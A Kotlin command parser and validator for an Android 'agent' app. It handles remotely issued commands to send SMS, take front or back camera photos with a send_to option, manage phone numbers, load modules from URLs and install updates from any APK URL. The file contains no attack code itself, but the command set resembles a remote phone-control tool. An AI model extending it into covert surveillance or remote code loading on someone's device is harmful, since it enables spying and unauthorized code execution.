package com.aman.agent.commands

import android.util.Log

/**
 * CommandParser - Parses and validates incoming commands
 * Supports various command formats and parameter extraction
 */
class CommandParser {

    companion object {
        private const val TAG = "CommandParser"
        private const val PARAMETER_SEPARATOR = " "
        private const val KEY_VALUE_SEPARATOR = "="
    }

    data class ParsedCommand(
        val action: String,
        val parameters: Map<String, String>,
        val rawCommand: String
    )

    /**
     * Parse a command string into action and parameters
     * Supports formats:
     * - Simple: "status"
     * - With parameters: "sms to=1234567890 message=Hello"
     * - Quoted parameters: "sms to=1234567890 message='Hello World'"
     */
    fun parseCommand(commandString: String): ParsedCommand? {
        return try {
            val trimmedCommand = commandString.trim()
            if (trimmedCommand.isEmpty()) {
                return null
            }

            // Split command into tokens
            val tokens = tokenizeCommand(trimmedCommand)
            if (tokens.isEmpty()) {
                return null
            }

            // First token is the action
            val action = tokens[0].lowercase()
            
            // Parse parameters from remaining tokens
            val parameters = parseParameters(tokens.drop(1))

            ParsedCommand(action, parameters, trimmedCommand)

        } catch (e: Exception) {
            Log.e(TAG, "Error parsing command: $commandString", e)
            null
        }
    }

    /**
     * Tokenize command string, handling quoted strings
     */
    private fun tokenizeCommand(command: String): List<String> {
        val tokens = mutableListOf<String>()
        var currentToken = StringBuilder()
        var inQuotes = false
        var quoteChar = '"'
        var i = 0

        while (i < command.length) {
            val char = command[i]

            when {
                // Handle quote characters
                (char == '"' || char == '\'') && !inQuotes -> {
                    inQuotes = true
                    quoteChar = char
                }
                char == quoteChar && inQuotes -> {
                    inQuotes = false
                }
                // Handle spaces
                char == ' ' && !inQuotes -> {
                    if (currentToken.isNotEmpty()) {
                        tokens.add(currentToken.toString())
                        currentToken.clear()
                    }
                }
                // Regular character
                else -> {
                    currentToken.append(char)
                }
            }
            i++
        }

        // Add final token
        if (currentToken.isNotEmpty()) {
            tokens.add(currentToken.toString())
        }

        return tokens
    }

    /**
     * Parse parameters from token list
     * Supports key=value format
     */
    private fun parseParameters(tokens: List<String>): Map<String, String> {
        val parameters = mutableMapOf<String, String>()

        for (token in tokens) {
            if (token.contains(KEY_VALUE_SEPARATOR)) {
                val parts = token.split(KEY_VALUE_SEPARATOR, limit = 2)
                if (parts.size == 2) {
                    val key = parts[0].trim().lowercase()
                    val value = parts[1].trim()
                    parameters[key] = value
                }
            } else {
                // Handle positional parameters or flags
                handlePositionalParameter(token, parameters)
            }
        }

        return parameters
    }

    /**
     * Handle positional parameters or flags
     */
    private fun handlePositionalParameter(token: String, parameters: MutableMap<String, String>) {
        when {
            // Boolean flags
            token.startsWith("--") -> {
                val flag = token.substring(2).lowercase()
                parameters[flag] = "true"
            }
            token.startsWith("-") -> {
                val flag = token.substring(1).lowercase()
                parameters[flag] = "true"
            }
            // Phone number detection
            isPhoneNumber(token) -> {
                if (!parameters.containsKey("to") && !parameters.containsKey("number")) {
                    parameters["to"] = token
                }
            }
            // URL detection
            isUrl(token) -> {
                if (!parameters.containsKey("url")) {
                    parameters["url"] = token
                }
            }
            // Default to message parameter if not already set
            else -> {
                if (!parameters.containsKey("message") && !parameters.containsKey("text")) {
                    parameters["message"] = token
                }
            }
        }
    }

    /**
     * Validate if string is a phone number
     */
    private fun isPhoneNumber(text: String): Boolean {
        val phonePattern = Regex("^[+]?[0-9]{10,15}$")
        return phonePattern.matches(text.replace(Regex("[\\s\\-\\(\\)]"), ""))
    }

    /**
     * Validate if string is a URL
     */
    private fun isUrl(text: String): Boolean {
        return text.startsWith("http://") || 
               text.startsWith("https://") || 
               text.startsWith("ftp://")
    }

    /**
     * Validate command structure
     */
    fun validateCommand(parsedCommand: ParsedCommand): ValidationResult {
        return when (parsedCommand.action) {
            "sms" -> validateSmsCommand(parsedCommand.parameters)
            "photo", "camera" -> validatePhotoCommand(parsedCommand.parameters)
            "add_number", "remove_number" -> validateNumberCommand(parsedCommand.parameters)
            "load_module" -> validateModuleCommand(parsedCommand.parameters)
            "learn" -> validateLearnCommand(parsedCommand.parameters)
            "update" -> validateUpdateCommand(parsedCommand.parameters)
            else -> ValidationResult(true, "Command format valid")
        }
    }

    private fun validateSmsCommand(parameters: Map<String, String>): ValidationResult {
        val to = parameters["to"] ?: parameters["number"]
        val message = parameters["message"] ?: parameters["text"]

        return when {
            to == null -> ValidationResult(false, "Missing recipient number")
            message == null -> ValidationResult(false, "Missing message text")
            !isPhoneNumber(to) -> ValidationResult(false, "Invalid phone number format")
            message.length > 160 -> ValidationResult(false, "Message too long (max 160 characters)")
            else -> ValidationResult(true, "SMS command valid")
        }
    }

    private fun validatePhotoCommand(parameters: Map<String, String>): ValidationResult {
        val camera = parameters["camera"]
        val quality = parameters["quality"]

        return when {
            camera != null && camera !in listOf("front", "back") -> 
                ValidationResult(false, "Camera must be 'front' or 'back'")
            quality != null && (quality.toIntOrNull() == null || quality.toInt() !in 1..100) ->
                ValidationResult(false, "Quality must be between 1-100")
            else -> ValidationResult(true, "Photo command valid")
        }
    }

    private fun validateNumberCommand(parameters: Map<String, String>): ValidationResult {
        val number = parameters["number"]

        return when {
            number == null -> ValidationResult(false, "Missing phone number")
            !isPhoneNumber(number) -> ValidationResult(false, "Invalid phone number format")
            else -> ValidationResult(true, "Number command valid")
        }
    }

    private fun validateModuleCommand(parameters: Map<String, String>): ValidationResult {
        val name = parameters["name"]
        val url = parameters["url"]

        return when {
            name == null -> ValidationResult(false, "Missing module name")
            url == null -> ValidationResult(false, "Missing module URL")
            !isUrl(url) -> ValidationResult(false, "Invalid URL format")
            name.length > 50 -> ValidationResult(false, "Module name too long")
            else -> ValidationResult(true, "Module command valid")
        }
    }

    private fun validateLearnCommand(parameters: Map<String, String>): ValidationResult {
        val command = parameters["command"]
        val action = parameters["action"]

        return when {
            command == null -> ValidationResult(false, "Missing command name")
            action == null -> ValidationResult(false, "Missing action")
            command.length > 30 -> ValidationResult(false, "Command name too long")
            action.length > 200 -> ValidationResult(false, "Action too long")
            else -> ValidationResult(true, "Learn command valid")
        }
    }

    private fun validateUpdateCommand(parameters: Map<String, String>): ValidationResult {
        val url = parameters["url"]

        return when {
            url == null -> ValidationResult(false, "Missing update URL")
            !isUrl(url) -> ValidationResult(false, "Invalid URL format")
            !url.endsWith(".apk") -> ValidationResult(false, "Update URL must point to APK file")
            else -> ValidationResult(true, "Update command valid")
        }
    }

    /**
     * Extract command suggestions for auto-completion
     */
    fun getCommandSuggestions(partialCommand: String): List<String> {
        val availableCommands = listOf(
            "status", "pause", "unpause", "resume",
            "sms", "photo", "camera",
            "add_number", "remove_number", "list_numbers",
            "learn", "load_module", "list_modules",
            "update", "help", "shutdown"
        )

        return if (partialCommand.isEmpty()) {
            availableCommands
        } else {
            availableCommands.filter { 
                it.startsWith(partialCommand.lowercase()) 
            }
        }
    }

    /**
     * Get parameter suggestions for a command
     */
    fun getParameterSuggestions(command: String): List<String> {
        return when (command.lowercase()) {
            "sms" -> listOf("to=", "message=")
            "photo", "camera" -> listOf("camera=front", "camera=back", "quality=", "send_to=")
            "add_number", "remove_number" -> listOf("number=")
            "load_module" -> listOf("name=", "url=")
            "learn" -> listOf("command=", "action=")
            "update" -> listOf("url=")
            else -> emptyList()
        }
    }

    data class ValidationResult(
        val isValid: Boolean,
        val message: String
    )
}
